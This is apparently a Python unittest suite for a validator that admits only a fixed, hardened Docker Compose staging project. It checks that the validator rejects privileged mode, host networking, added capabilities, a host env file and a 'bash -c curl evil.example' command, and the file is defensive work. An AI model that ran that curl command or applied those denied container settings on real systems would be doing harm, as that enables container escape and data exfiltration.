"""M14F Compose fixed-project admission, only pure in-memory fixtures."""
from __future__ import annotations
import copy
import hashlib
import json
import unittest

from updater import linux_stage_compose_contract as c

PIN = "f" * 64
IMAGES = {
    "api": "registry.example.invalid/fieldwork-api@sha256:" + "a" * 64,
    "db": "registry.example.invalid/fieldwork-db@sha256:" + "b" * 64,
    "nginx": "registry.example.invalid/fieldwork-nginx@sha256:" + "c" * 64,
}

def cfg():
    services = {}
    for s in c.SERVICES:
        services[s] = {
            "image": IMAGES[s],
            "read_only": s != "db",
            "cap_drop": ["ALL"],
            "security_opt": ["no-new-privileges:true"],
            "networks": ["default"],
            "user": "65534:65534",
            "init": True,
            "pids_limit": 64,
            "mem_limit": "128m",
        }
    services["nginx"]["ports"] = [{
        "target": 80, "published": "18081",
        "host_ip": "127.0.0.1", "protocol": "tcp",
    }]
    services["db"]["volumes"] = [{
        "type": "volume", "source": "data",
        "target": "/var/lib/postgresql/data", "read_only": False,
    }]
    return {
        "name": "fieldwork-stage",
        "services": services,
        "networks": {"default": {
            "name": "fieldwork-stage_default",
            "internal": True,
        }},
        "volumes": {"data": {"name": "fieldwork-stage_data"}},
    }


def blob(obj):
    return json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()


class ContractTests(unittest.TestCase):
    def check(self, data=None, *, images=IMAGES,
              src=PIN, actual=PIN):
        return c.validate_config(
            blob(data) if data is not None else blob(cfg()),
            locally_pinned_images=images,
            source_sha256=src,
            actual_source_sha256=actual,
        )

    def test_exact_safe_stage_three_services_only(self):
        result = self.check()
        self.assertEqual(result["status"], "STAGE_COMPOSE_OFFLINE_ADMITTED")
        self.assertFalse(result["docker_command_executed"])
        self.assertFalse(result["activation_authorized"])
        self.assertFalse(result["release_publisher_verified"])
        self.assertFalse(result["production_modified"])
        self.assertEqual(result["source_sha256"], PIN)
        self.assertEqual(result["rendered_config_sha256"],
                         hashlib.sha256(blob(cfg())).hexdigest())
        self.assertEqual(result["image_digests"], IMAGES)

    def test_project_or_additional_services_cannot_be_selected(self):
        for name in ("fieldwork", "homeassistant", "other", "", 0):
            config = cfg()
            config["name"] = name
            with self.subTest(name=name), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_PROJECT_DENIED"):
                self.check(config)
        config = cfg()
        config["services"]["redis"] = copy.deepcopy(config["services"]["api"])
        with self.assertRaisesRegex(c.ComposeDenied,
                                    "STAGE_COMPOSE_SERVICE_SET_DENIED"):
            self.check(config)

    def test_yaml_and_shell_untrusted_fields_denied(self):
        forbidden = [
            {"privileged": True},
            {"build": {"context": "/"}},
            {"network_mode": "host"},
            {"pid": "host"}, {"ipc": "host"},
            {"userns_mode": "host"},
            {"devices": ["/dev/sda:/dev/sda"]},
            {"cap_add": ["SYS_ADMIN"]},
            {"extra_hosts": ["host.docker.internal:host-gateway"]},
            {"env_file": ["/home/mcp/.env"]},
            {"environment": {"TOKEN": "private"}},
            {"entrypoint": ["/bin/sh"]},
            {"command": ["bash", "-c", "curl evil.example"]},
            {"logging": {"driver": "syslog"}},
            {"volumes_from": ["fieldwork-api-1"]},
            {"container_name": "fieldwork-api-1"},
            {"labels": {"com.docker.compose.project": "fieldwork"}},
            {"restart": "always"},
        ]
        for bad in forbidden:
            config = cfg()
            config["services"]["api"].update(bad)
            with self.subTest(bad=bad), self.assertRaisesRegex(
                    c.ComposeDenied,
                    "STAGE_COMPOSE_SERVICE_KEYS_OR_IMAGE_DENIED"):
                self.check(config)

    def test_public_port_and_host_network_denied(self):
        for ip in ("0.0.0.0", "::", "192.168.22.13"):
            config = cfg()
            config["services"]["nginx"]["ports"][0]["host_ip"] = ip
            with self.subTest(ip=ip), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_PUBLIC_PORT_DENIED"):
                self.check(config)
        for service in ("api", "db"):
            config = cfg()
            config["services"][service]["ports"] = [{"target": 5432}]
            with self.subTest(service=service), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_UNEXPECTED_PORT"):
                self.check(config)

    def test_host_path_bind_mount_never_accepted(self):
        for mount in (
            {"type": "bind", "source": "/opt/fieldwork",
             "target": "/data", "read_only": False},
            {"type": "volume", "source": "fieldwork-db",
             "target": "/var/lib/postgresql/data", "read_only": False},
            {"type": "volume", "source": "data",
             "target": "/var/lib/postgresql/data", "read_only": True},
        ):
            config = cfg()
            config["services"]["db"]["volumes"] = [mount]
            with self.subTest(mount=mount), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_DB_VOLUME_DENIED"):
                self.check(config)

    def test_wrong_image_digest_or_tag_denied(self):
        for image in (
            "postgres:18-alpine",
            "alpine:latest",
            "registry.example.invalid/api@sha256:" + "0" * 63,
            "registry.example.invalid/api@sha256:" + "d" * 64,
            "registry.example.invalid/api@sha256:" + "A" * 64,
        ):
            config = cfg()
            config["services"]["api"]["image"] = image
            with self.subTest(image=image), self.assertRaisesRegex(
                    c.ComposeDenied,
                    "STAGE_COMPOSE_SERVICE_KEYS_OR_IMAGE_DENIED"):
                self.check(config)

    def test_pinned_source_sha_must_match_current_bytes(self):
        with self.assertRaisesRegex(
                c.ComposeDenied, "STAGE_COMPOSE_SOURCE_DRIFT"):
            self.check(src="f"*64,actual="d"*64)
        with self.assertRaisesRegex(
                c.ComposeDenied, "STAGE_COMPOSE_SOURCE_DRIFT"):
            self.check(src="xyz",actual="xyz")

    def test_locally_pinned_images_reject_mutable_or_foreign(self):
        for images in (
            {"api": IMAGES["api"]},
            {**IMAGES, "redis": IMAGES["api"]},
            {**IMAGES, "db": "postgres:18"},
        ):
            with self.subTest(images=images), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_LOCAL_IMAGE_PINS_DENIED"):
                self.check(images=images)

    def test_security_defaults_never_relaxed(self):
        changes = [
            ("read_only", False),
            ("cap_drop", ["NET_ADMIN"]),
            ("security_opt", []),
            ("networks", ["host"]),
            ("user", "root"),
            ("init", False),
            ("pids_limit", 1000),
            ("mem_limit", "8g"),
        ]
        for key, value in changes:
            config = cfg()
            config["services"]["api"][key] = value
            with self.subTest(key=key), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_SERVICE_SECURITY_DENIED"):
                self.check(config)

    def test_strict_network_and_volumes(self):
        for change in (
            {"name": "fieldwork_default", "internal": True},
            {"name": "fieldwork-stage_default", "internal": False},
            {"name": "fieldwork-stage_default", "internal": True,
             "external": True},
        ):
            config = cfg()
            config["networks"]["default"] = change
            with self.subTest(change=change), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_NETWORK_DENIED"):
                self.check(config)
        config=cfg()
        config["volumes"]["data"]["name"]="fieldwork-db"
        with self.assertRaisesRegex(c.ComposeDenied,
                                    "STAGE_COMPOSE_VOLUMES_DENIED"):
            self.check(config)

    def test_only_exact_top_level_fields(self):
        for forbidden in ("secrets", "configs", "x-shell", "include"):
            config=cfg()
            config[forbidden]={}
            with self.subTest(field=forbidden), self.assertRaisesRegex(
                    c.ComposeDenied, "STAGE_COMPOSE_TOP_KEYS_DENIED"):
                self.check(config)

    def test_malformed_nonfinite_duplicate_and_oversized_json(self):
        bad = [
            b"",
            b"{broken",
            b'{"name":"fieldwork-stage","name":"fieldwork"}',
            b'{"name":NaN}',
            b'{"name":Infinity}',
            b"x" * (c.MAX_JSON + 1),
        ]
        for data in bad:
            with self.subTest(data=data[:40]), self.assertRaises(c.ComposeDenied):
                c.validate_config(data,
                                  locally_pinned_images=IMAGES,
                                  source_sha256=PIN,
                                  actual_source_sha256=PIN)

    def test_no_hidden_docker_or_filesystem_execution(self):
        import inspect
        source=inspect.getsource(c)
        for forbidden in ("import subprocess", "os.system(", "docker run",
                          "docker compose up", "shell=True",
                          "subprocess.run(", ".write_bytes(", ".unlink("):
            self.assertNotIn(forbidden, source)


if __name__ == "__main__":
    unittest.main()
